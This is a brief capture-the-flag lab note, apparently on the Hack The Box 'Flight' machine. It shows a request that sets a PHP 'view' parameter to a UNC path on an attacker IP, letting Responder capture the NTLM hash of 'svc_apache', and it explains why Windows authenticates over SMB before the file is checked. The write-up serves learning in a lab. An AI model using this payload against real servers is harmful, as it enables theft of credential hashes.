if we make a request to with the view parameter like this http://school.flight.htb/index.php?view=//10.10.14.74/songbird and look at responder we see a hash from the user 'svc_apache'

How it works and why it works.

webserver takes view= and tries to open \\10.10.14.74\songbird → treated as a UNC path → Windows/PHP must connect over SMB before checking if the file even exists → your Responder box answers as a fake SMB server → SMB requires auth to browse a share → the host auto-sends its NTLM hash to prove identity → Responder captures the handshake → done, since auth happens before Windows ever checks if songbird is real.
